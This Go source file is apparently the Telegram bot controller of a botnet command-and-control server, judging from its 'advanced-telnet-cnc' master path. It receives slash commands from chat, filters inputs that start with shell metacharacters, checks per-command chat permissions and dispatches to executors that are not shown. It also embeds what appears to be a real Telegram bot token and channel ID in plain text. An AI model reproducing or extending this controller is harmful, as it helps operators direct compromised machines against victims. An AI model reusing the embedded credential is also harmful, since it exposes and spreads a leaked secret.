package telegram

import (
	command "advanced-telnet-cnc/source/master/telegram/commands"
	"fmt"
	"github.com/mattn/go-shellwords"
	"log"
	"strings"

	"github.com/go-telegram-bot-api/telegram-bot-api"
)

var (
	Bot *tgbotapi.BotAPI
)

func Serve() {
	var err error
	Bot, err = tgbotapi.NewBotAPI("6912221795:AAH9BGc_LdcC2OdhPZtJDXXV5N3pBRW4Zb8")
	if err != nil {
		log.Panic(err)
	}

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates, err := Bot.GetUpdatesChan(u)
	if err != nil {
		log.Fatal(err)
	}

	for update := range updates {
		if update.Message == nil {
			continue
		}

		line := update.Message.Text

		if strings.Trim(line, " ") == "" {
			fmt.Println("test")
			continue
		}

		if strings.HasPrefix(line, "|") || strings.HasPrefix(line, "&") || strings.HasPrefix(line, "<") || strings.HasPrefix(line, ">") || strings.HasPrefix(line, ";") {
			fmt.Println("test2")
			continue
		}

		if !strings.HasPrefix(line, "/") {
			fmt.Println("test3")
			continue
		}

		line = strings.ReplaceAll(line, "@"+Bot.Self.UserName, "")

		args, err := shellwords.Parse(line)
		if err != nil {
			fmt.Println("test4")
			continue
		}

		cmd := command.Retrieve(args[0][1:])
		if cmd == nil {
			fmt.Println("test5")
			continue
		}

		if !InSlice(int64(update.Message.Chat.ID), cmd.AllowedIDs) {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "[*] Not enough permissions!")
			msg.ReplyToMessageID = update.Message.MessageID
			_, err := Bot.Send(msg)
			if err != nil {
				continue
			}

			return
		}

		err = cmd.Executor(args[1:], Bot, update)
		if err != nil {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "[*] Error while executing command: "+err.Error())
			msg.ReplyToMessageID = update.Message.MessageID
			_, err := Bot.Send(msg)
			if err != nil {
				continue
			}

			continue
		}
	}
}

func Send(msg string) {
	if Bot == nil {
		return
	}

	channelID := -1002047050306
	message := tgbotapi.NewMessage(int64(channelID), msg)
	_, err := Bot.Send(message)
	if err != nil {
		return
	}
}

func InSlice(a int64, list []int64) bool {
	if len(list) < 1 {
		return true
	}

	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}
